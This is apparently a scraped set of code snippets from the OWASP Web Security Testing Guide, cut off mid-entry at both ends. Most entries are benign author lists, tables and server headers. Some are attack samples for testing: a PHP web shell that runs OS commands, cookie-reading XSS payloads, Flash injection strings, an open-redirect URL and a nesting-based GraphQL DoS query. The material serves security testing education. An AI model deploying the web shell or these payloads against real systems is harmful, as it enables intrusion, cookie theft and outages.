functions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n/administrator/index.php\n/administrator/index.php?option=com_login\n/administrator/index.php?option=com_content\n/administrator/index.php?option=com_users\n/administrator/index.php?option=com_menus\n/administrator/index.php?option=com_installer\n/administrator/index.php?option=com_config\n```\n\n----------------------------------------\n\nTITLE: Listing Reviewers for OWASP Testing Guide v2 in HTML\nDESCRIPTION: This HTML code block lists the reviewers who contributed to version 2 of the OWASP Testing Guide. It includes names of security professionals who reviewed and validated the content of this early version of the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n- Vicente Aguilera      - Mauro Bregolin          - Daniel Cuthbert       - Stefano Di Paola\n- Simona Forti          - Eoin Keary              - Katie McDowell        - Matteo Meucci\n- Antonio Parata        - Mark Roxberry           - Marco Belotti         - Marco Cova\n- Paul Davies           - Matteo G.P. Flora       - Darrell Groundy       - James Kist\n- Marco Mella           - Syed Mohamed A.         - Alberto Revelli       - Dave Wichers\n```\n\n----------------------------------------\n\nTITLE: HTML Output with Poisoned Domain Reference\nDESCRIPTION: HTML output that shows how a web application might incorporate the attacker-controlled domain from a header into the response, creating links to malicious resources.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n[...]\n<link src=\"https://www.attacker.com/link\" />\n[...]\n```\n\n----------------------------------------\n\nTITLE: Creating SWID Tag for ACME Roadrunner Service Pack 1 in XML\nDESCRIPTION: This XML snippet demonstrates how to create a SWID tag for a software patch. It includes details like the software name, tag ID, version, and entity information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/5-Reporting/02-Naming_Schemes.md#2025-04-22_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<SoftwareIdentity\n                  xmlns=\"https://standards.iso.org/iso/19770/-2/2015/schema.xsd\"\n                  name=\"ACME Roadrunner Service Pack 1\"\n                  tagId=\"com.acme.rms-ce-sp1-v1-0-0\"\n                  patch=\"true\"\n                  version=\"1.0.0\">\n  <Entity\n          name=\"The ACME Corporation\"\n          regid=\"acme.com\"\n          role=\"tagCreator softwareCreator\"/>\n  <Link\n        rel=\"patches\"\n        href=\"swid:com.acme.rms-ce-v4-1-5-0\">\n    ...\n</SoftwareIdentity>\n```\n\n----------------------------------------\n\nTITLE: Social Media Follow Badge in Markdown\nDESCRIPTION: Markdown syntax for displaying a badge to follow OWASP Web Security Testing Guide on Twitter, using an image shield format that shows the current follower count.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/1-Frontispiece/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n[![Follow @owasp_wstg on twitter](https://img.shields.io/twitter/follow/owasp_wstg?style=social)](https://twitter.com/owasp_wstg)\n```\n\n----------------------------------------\n\nTITLE: Nginx Server Response Headers\nDESCRIPTION: Example of HTTP response headers from an Nginx web server showing version information and header structure\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \"5d71489a-75\"\nAccept-Ranges: bytes\n...\n```\n\n----------------------------------------\n\nTITLE: WSTG Scenario Reference Format Example\nDESCRIPTION: Demonstrates the standardized format for referencing WSTG test scenarios, including version-specific and version-agnostic formats.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/2-Introduction/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nWSTG-<category>-<number>\\nWSTG-<version>-<category>-<number>\\nWSTG-v42-INFO-02\n```\n\n----------------------------------------\n\nTITLE: Displaying Test Case ID in Markdown\nDESCRIPTION: This snippet shows how to format a test case ID in a Markdown table. It's used to identify the specific test case being described in the document.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-BUSL-02|\n```\n\n----------------------------------------\n\nTITLE: Apache Malformed Request Response\nDESCRIPTION: Example of Apache server response to a malformed HTTP request showing error handling and version information\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\nGET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n</body></html>\n```\n\n----------------------------------------\n\nTITLE: Detecting Page Refresh Metadata in HTML\nDESCRIPTION: Example of an HTML META tag implementing a page refresh. This could potentially be exploited for phishing attacks or to bypass certain security controls.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\">\n```\n\n----------------------------------------\n\nTITLE: AWS Cognito Lockout Duration Formula\nDESCRIPTION: Mathematical formula used by AWS Cognito for calculating lockout duration in seconds. The duration doubles with each failed attempt after 5 failures, with a maximum of 15 minutes.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n2^(n-5)\n```\n\n----------------------------------------\n\nTITLE: Searching for PII in Source Code or Logs\nDESCRIPTION: This grep command demonstrates how to search for patterns that might indicate personally identifiable information (PII) such as phone numbers in source code or log files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngrep -r \" {2\\}[0-9]\\{6\\} \"  ./PathToSearch/\n```\n\n----------------------------------------\n\nTITLE: Markdown Table of Contents Structure\nDESCRIPTION: A hierarchical markdown document outlining the complete structure of the OWASP Testing Guide using headers and links\nSOURCE: https://github.com/owasp/wstg/blob/master/document/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Table of Contents\n\n## 0. [Foreword by Eoin Keary](0-Foreword/README.md)\n\n## 1. [Frontispiece](1-Frontispiece/)\n\n## 2. [Introduction](2-Introduction/)\n\n### 2.1 [The OWASP Testing Project](2-Introduction/README.md#The-OWASP-Testing-Project)\n\n### 2.2 [Principles of Testing](2-Introduction/README.md#Principles-of-Testing)\n...\n```\n\n----------------------------------------\n\nTITLE: Listing Authors for OWASP Testing Guide v2 in HTML\nDESCRIPTION: This HTML code block lists the authors who contributed to version 2 of the OWASP Testing Guide. It includes names of security experts who were involved in creating this early version of the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n- Vicente Aguilera      - David Endler               - Matteo Meucci        - Anush Shetty\n- Mauro Bregolin        - Giorgio Fedon              - Marco Morana         - Larry Shields\n- Tom Brennan           - Javier Fernández-Sanguino  - Laura Nunez          - Dafydd Studdard\n- Gary Burns            - Andrew van der Stock       - Glyn Geoghegan       - Gunter Ollmann\n- Luca Carettoni        - Sebastien Deleersnyder     - Antonio Parata       - Ariel Waissbein\n- Dan Cornell           - Madhura Halasgikar         - Yiannis Pavlosoglou  - Jeff Williams\n- Mark Curphey          - Eoin Keary                 - Carlo Pelliccioni    - Tushar Vartak\n- Daniel Cuthbert       - David Litchfield           - Harinath Pudipeddi   - Tom Ryan\n- Stan Guzik            - Andrea Lombardini          - Alberto Revelli      - Claudio Merloni\n- Stephen DeVries       - Ralph M. Los               - Stefano Di Paola     - Mark Roxberry\n```\n\n----------------------------------------\n\nTITLE: Detecting Adobe ColdFusion via HTML Comments\nDESCRIPTION: HTML comment marker specific to Adobe ColdFusion applications. This comment tag indicates the start of ColdFusion headerTags.cfm section.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<!-- START headerTags.cfm\n```\n\n----------------------------------------\n\nTITLE: Example Authentication Channel Comparison Table in Markdown\nDESCRIPTION: This code snippet demonstrates how to create a comparison table in Markdown format to enumerate authentication functionality across different channels. It helps visualize the differences in authentication features between the primary channel and alternative channels.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n  | Primary | Mobile  |  Call Center | Partner Website |\n  |---------|---------|--------------|------------------|\n  | Register| Yes     |     -        |       -         |\n  | Log in  | Yes     |    Yes       |    Yes(SSO)     |\n  | Log out |   -     |     -        |       -         |\n  |Password reset |   Yes  |   Yes   |       -         |\n  | -       | Change password |   -  |       -         |\n```\n\n----------------------------------------\n\nTITLE: Retrieving and Displaying humans.txt Using wget and cat in Bash\nDESCRIPTION: This snippet demonstrates how to download the humans.txt file from Google's website using wget and then display its contents using cat. It shows the command execution and the output, including the file's content and download details.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ wget --no-verbose  https://www.google.com/humans.txt && cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -> \"humans.txt\" [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you'd like to help us out, see careers.google.com.\n```\n\n----------------------------------------\n\nTITLE: Displaying Test Case ID in Markdown Table\nDESCRIPTION: This snippet shows how to create a simple Markdown table to display the test case ID for the 'Test Upload of Unexpected File Types' scenario.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-BUSL-08|\n```\n\n----------------------------------------\n\nTITLE: Example of Potentially Weak Password in Markdown\nDESCRIPTION: Example of a simple password that meets minimal requirements but remains weak due to predictable pattern and common usage.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n`Password1`\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic PHP Web Shell for Testing\nDESCRIPTION: A simple PHP web shell that executes operating system commands passed via a GET parameter. It includes IP-based access restriction for security during testing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md#2025-04-22_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n    if ($_SERVER['REMOTE_HOST'] === \"FIXME\") { // Set your IP address here\n        if(isset($_REQUEST['cmd'])){\n            $cmd = ($_REQUEST['cmd']);\n            echo \"<pre>\\n\";\n            system($cmd);\n            echo \"</pre>\";\n        }\n    }\n?>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Code Syntax Highlighting in Markdown\nDESCRIPTION: This snippet shows how to use code fences with syntax highlighting for code snippets in Markdown.\nSOURCE: https://github.com/owasp/wstg/blob/master/style_guide.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n```md\n    ```javascript\n    if (isAwesome){\n        return true\n    }\n    ```\n```\n```\n\n----------------------------------------\n\nTITLE: Markdown Block Quote Example with Ellipsis\nDESCRIPTION: Demonstrates proper use of ellipsis in a markdown block quote to indicate omitted text while preserving meaning.\nSOURCE: https://github.com/owasp/wstg/blob/master/style_guide.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n> Linus Torvalds once said, \"Once you realize that documentation should be laughed at... THEN, and only then, have you reached the level where you can safely read it and try to use it to actually implement a driver. \"\n```\n\n----------------------------------------\n\nTITLE: WAF Detection Test Parameters\nDESCRIPTION: Example parameters used to detect Web Application Firewall presence by testing common attack string patterns that would typically be blocked.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nfoo=' UNION SELECT 1\\nfoo=><script>alert(1)</script>\n```\n\n----------------------------------------\n\nTITLE: Referencing Template Explanation in Markdown\nDESCRIPTION: Demonstrates how to link to a template explanation file using Markdown syntax. The link points to a file named '2-Template_Explanation.md' in the '999-Foo_Testing' directory.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/README.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n[explanation of that template](999-Foo_Testing/2-Template_Explanation.md)\n```\n\n----------------------------------------\n\nTITLE: Testing Access Token Lifetime with Bearer Token Authorization\nDESCRIPTION: HTTP GET request example showing how to test an access token's lifetime validation by sending a request to a protected endpoint with a Bearer token in the Authorization header.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_8\n\nLANGUAGE: http\nCODE:\n```\nGET /userinfo HTTP/1.1\nHost: as.example.com\n[...]\nAuthorization: Bearer eyJhbGciOiJkaXIiL[...]\n\n```\n\n----------------------------------------\n\nTITLE: Exploiting Client-side URL Redirect Vulnerability\nDESCRIPTION: This example shows how an attacker could exploit the vulnerable JavaScript code by crafting a malicious URL. The URL includes a hash parameter that redirects the user to a potentially harmful site.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://www.victim.site/?#www.malicious.site\n```\n\n----------------------------------------\n\nTITLE: Defining TensorFlow Model for Image Recognition\nDESCRIPTION: TensorFlow code snippet that defines a MobileNetV2-based model for image feature extraction. The model uses specific layers for different image resolutions and creates a feature extraction pipeline.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md#2025-04-22_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nbase_model = tf.keras.applications.MobileNetV2(input_shape=[128, 128, 3], include_top=False)\n\n# Use the activations of these layers\nlayer_names = [\n    'block_1_expand_relu',   # 64x64\n    'block_3_expand_relu',   # 32x32\n    'block_6_expand_relu',   # 16x16\n    'block_13_expand_relu',  # 8x8\n    'block_16_project',      # 4x4\n]\nlayers = [base_model.get_layer(name).output for name in layer_names]\n\n# Create the feature extraction model\ndown_stack = tf.keras.Model(inputs=base_model.input, outputs=layers)\n\ndown_stack.trainable = False\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Markdown Table Format for WSTG Article ID\nDESCRIPTION: Shows how to create a Markdown table containing the ID of the testing scenario at the beginning of a WSTG article.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/2-Template_Explanation.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-FOO-002|\n```\n\n----------------------------------------\n\nTITLE: Listing Authors for OWASP Testing Guide v4 in HTML\nDESCRIPTION: This HTML code block lists the authors who contributed to version 4 of the OWASP Testing Guide. It includes names of various security professionals and experts who were involved in creating the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n- Matteo Meucci          - Thomas Ryan       - Mike Hryekewicz  - Eduardo Castellano - Babu Arokiadas\n- Pavol Luptak           - Tim Bertels       - Simon Bennetts   - Simone Onofri      - Rob Barnes\n- Marco Morana           - Cecil Su          - Ray Schippers    - Harword Sheen      - Ben Walther\n- Giorgio Fedon          - Aung KhAnt        - Raul Siles       - Amro AlOlaqi       - Anant Shrivastava\n- Stefano Di Paola       - Norbert Szetei    - Jayanta Karmakar - Suhas Desai        - Colin Watson\n- Gianrico Ingrosso      - Michael Boman     - Brad Causey      - Ryan Dewhurst      - Luca Carettoni\n- Giuseppe Bonfà         - Wagner Elias      - Vicente Aguilera - Zaki Akhmad        - Eoin Keary\n- Andrew Muller          - Kevin Horvat      - Ismael Gonçalves - Davide Danelon     - Jeff Williams\n- Robert Winkel          - Tom Brennan       - David Fern       - Alexander Antukh   - Juan Manuel Bahamonde\n- Roberto Suggi Liverani - Tomas Zatko       - Tom Eston        - Thomas Kalamaris   - Thomas Skora\n- Tripurari Rai          - Juan Galiana Lara - Kevin Horvath    - Alexander Vavousis - Irene Abezgauz\n- Robert Smith           - Sumit Siddharth   - Rick Mitchell    - Christian Heinrich - Hugo Costa\n```\n\n----------------------------------------\n\nTITLE: Sample HTTP Response with Server Information\nDESCRIPTION: Shows a truncated HTTP response that includes server version information in the HTML title tag.\nSOURCE: https://github.com/owasp/wstg/blob/master/template/999-Foo_Testing/3-Format_for_HTTP_Request_Response.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200\n[...]\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>Apache Tomcat/10.0.4\n[...]\n```\n\n----------------------------------------\n\nTITLE: Server Response Setting Session Cookie in HTTP\nDESCRIPTION: This snippet illustrates a typical server response that sets a session cookie (JSESSIONID). It shows how the server initializes a session, which is crucial for understanding the session fixation vulnerability.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nDate: Wed, 14 Aug 2008 08:45:11 GMT\nServer: IBM_HTTP_Server\nSet-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure\nCache-Control: no-cache=\"set-cookie,set-cookie2\"\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html;charset=Cp1254\nContent-Language: en-US\n```\n\n----------------------------------------\n\nTITLE: Malicious JavaScript Payload for XSS Attack\nDESCRIPTION: This JavaScript code represents a simple XSS payload that, when executed, will display the document's cookies in an alert box.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nalert(document.cookie)\n```\n\n----------------------------------------\n\nTITLE: Listing Reviewers for OWASP Testing Guide v4 in HTML\nDESCRIPTION: This HTML code block lists the reviewers who contributed to version 4 of the OWASP Testing Guide. It includes names of security professionals who reviewed and validated the content of the guide.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/E-History.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n- Davide Danelon          - Andrea Rosignoli     - Irene Abezgauz\n- Lode Vanstechelman      - Sebastien Gioria     - Yiannis Pavlosoglou\n- Aditya Balapure\n```\n\n----------------------------------------\n\nTITLE: Malicious PHP and JavaScript Payload for CORS-based XSS Attack\nDESCRIPTION: This code represents a malicious payload that sets CORS headers and includes JavaScript to execute an XSS attack, displaying the document's cookies.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<?php\nheader('Access-Control-Allow-Origin: https://www.victim.com');\n?>\n<script>alert(document.cookie);</script>\n```\n\n----------------------------------------\n\nTITLE: Malicious JavaScript Injection via getURL\nDESCRIPTION: Example of a malicious URL that injects JavaScript code through the URI parameter in a vulnerable getURL implementation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_9\n\nLANGUAGE: text\nCODE:\n```\nhttps://victim/file.swf?URI=javascript:evilcode\n```\n\n----------------------------------------\n\nTITLE: asfunction Protocol Injection Example\nDESCRIPTION: Shows how the asfunction protocol can be used to execute ActionScript functions instead of opening URLs, potentially leading to JavaScript execution.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_12\n\nLANGUAGE: actionscript\nCODE:\n```\nasfunction:getURL,javascript:evilcode\n```\n\n----------------------------------------\n\nTITLE: HTML Injection Attack Examples\nDESCRIPTION: These HTML snippets demonstrate various attack vectors that could be used if HTML injection is possible in a TextField object. They include direct XSS, function calls, and loading external SWF files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<a href='javascript:alert(123)'>\n```\n\nLANGUAGE: html\nCODE:\n```\n<a href='asfunction:function,arg'>\n```\n\nLANGUAGE: html\nCODE:\n```\n<a href='asfunction:_root.obj.function, arg'>\n```\n\nLANGUAGE: html\nCODE:\n```\n<a href='asfunction:System.Security.allowDomain,evilhost'>\n```\n\nLANGUAGE: html\nCODE:\n```\n<img src='https://evil/evil.swf'>\n```\n\nLANGUAGE: html\nCODE:\n```\n<img src='javascript:evilcode//.swf'>\n```\n\n----------------------------------------\n\nTITLE: Testing Cross-Site Scripting (XSS) in GraphQL\nDESCRIPTION: This snippet demonstrates how to test for reflected XSS vulnerabilities in GraphQL error messages by injecting malicious scripts into query parameters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_4\n\nLANGUAGE: graphql\nCODE:\n```\nquery xss  {\n  myInfo(veterinaryId:\"<script>alert('1')</script>\" ,accessToken:\"<script>alert('1')</script>\") {\n    id\n    name\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Detecting Hardcoded Credentials in HTML Comments\nDESCRIPTION: Example of a hardcoded database administrator password in an HTML comment. This is a severe security risk if found in production code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!-- Use the DB administrator password for testing:  f@keP@a$$w0rD -->\n```\n\n----------------------------------------\n\nTITLE: Analyzing Source Map File Content\nDESCRIPTION: Example of a source map file revealing internal file paths and structure. This information could be used by attackers to understand the application's architecture.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"version\": 3,\n  \"file\": \"static/js/main.chunk.js\",\n  \"sources\": [\n    \"/home/sysadmin/cashsystem/src/actions/index.js\",\n    \"/home/sysadmin/cashsystem/src/actions/reportAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/userAction.js\",\n    \"...\"\n  ],\n  \"...\"\n}\n```\n\n----------------------------------------\n\nTITLE: Detecting Business Catalyst via HTML Comment\nDESCRIPTION: HTML comment tag specific to Adobe Business Catalyst websites. This marker is used to identify sites built on this platform.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_13\n\nLANGUAGE: html\nCODE:\n```\n<!-- BC_OBNW -->\n```\n\n----------------------------------------\n\nTITLE: Using Unfurl to Extract URL Components\nDESCRIPTION: Unfurl extracts subdomains, paths, and parameters from URLs for deeper analysis. This tool breaks down URLs into their component parts for easier inspection during security testing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/A-Testing_Tools_Resource.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nunfurl \"https://example.com/page?query=123\"\n```\n\n----------------------------------------\n\nTITLE: Version Control Table Format in Markdown\nDESCRIPTION: Example markdown table format for tracking report versions, including columns for version number, description, date, and author.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/5-Reporting/01-Reporting_Structure.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Version | Description | Date | Author |\n|:-------:|-------------|------|--------|\n| 1.0 | Initial report | DD/MM/YYYY | J. Doe |\n```\n\n----------------------------------------\n\nTITLE: Documentation References to STRIDE in Markdown\nDESCRIPTION: A markdown reference to the STRIDE threat classification framework, which categorizes threats into six types: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/2-Introduction/README.md#2025-04-22_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n[STRIDE](https://en.wikipedia.org/wiki/STRIDE_(security))\n```\n\n----------------------------------------\n\nTITLE: Setting Up Markdown Linter Configuration in VS Code\nDESCRIPTION: JSON configuration for setting up the markdownlint VS Code extension to use the project's custom rules file\nSOURCE: https://github.com/owasp/wstg/blob/master/CONTRIBUTING.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"markdownlint.config\": {\n  \"extends\": \".github/configs/.markdownlint.json\"\n}\n```\n\n----------------------------------------\n\nTITLE: Illustrating WSTG Project Folder Structure\nDESCRIPTION: This snippet demonstrates the expected folder structure for the WSTG project, including the placement of articles, images, and subdirectories.\nSOURCE: https://github.com/owasp/wstg/blob/master/style_guide.md#2025-04-22_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ndocument/\n ├───0_Foreword/\n │   └───0_Foreword.md\n ├───1_Frontispiece/\n │   ├───images/\n │   │   └───example.jpg\n │   └───1_Frontispiece.md\n ├───2_Introduction/\n │   ├───images/\n │   │   └───example.jpg\n │   └───2_Introduction.md\n ├───3_The_OWASP_Testing_Framework/\n │   ├───images/\n │   │   └───example.jpg\n │   └───3_The_OWASP_Testing_Framework.md\n ├───4_Web_Application_Security_Testing/\n │   ├───4.1_Introduction_and_Objectives/\n │   │   └───4.1_Testing_Introduction_and_Objectives.md\n │   ├───4.2_Information_Gathering/\n │   │   ├───images/\n │   │   │   └───example.jpg\n │   │   ├───4.2_Testing_Information_Gathering.md\n │   │   └───4.2.1_Conduct_Search_Engine_Discovery.md\n```\n\n----------------------------------------\n\nTITLE: Displaying Test ID in Markdown Table\nDESCRIPTION: This snippet shows how to create a simple Markdown table to display the test ID for network infrastructure configuration testing.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|ID          |\n|------------|\n|WSTG-CONF-01|\n```\n\n----------------------------------------\n\nTITLE: Denial of Service (DoS) Query in GraphQL\nDESCRIPTION: This example shows how to craft a deeply nested query that could potentially cause a denial of service by overloading the GraphQL server's resources.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_5\n\nLANGUAGE: graphql\nCODE:\n```\nquery dos {\n  allDogs(onlyFree: false, limit: 1000000) {\n    id\n    name\n    veterinary {\n      id\n      name\n      dogs {\n        id\n        name\n        veterinary {\n          id\n          name\n          dogs {\n            id\n            name\n            veterinary {\n              id\n              name\n              dogs {\n                id\n                name\n                veterinary {\n                  id\n                  name\n                  dogs {\n                    id\n                    name\n                    veterinary {\n                      id\n                      name\n                      dogs {\n                        id\n                        name\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Authors for OWASP Testing Guide v3 in HTML\nDESCRIPTION: This HTML code block lists the authors who contributed to version 3 of the OWASP Testing Guide. It includes names of security experts who were involved in creating this earlier version of the guide.\nSOURCE: 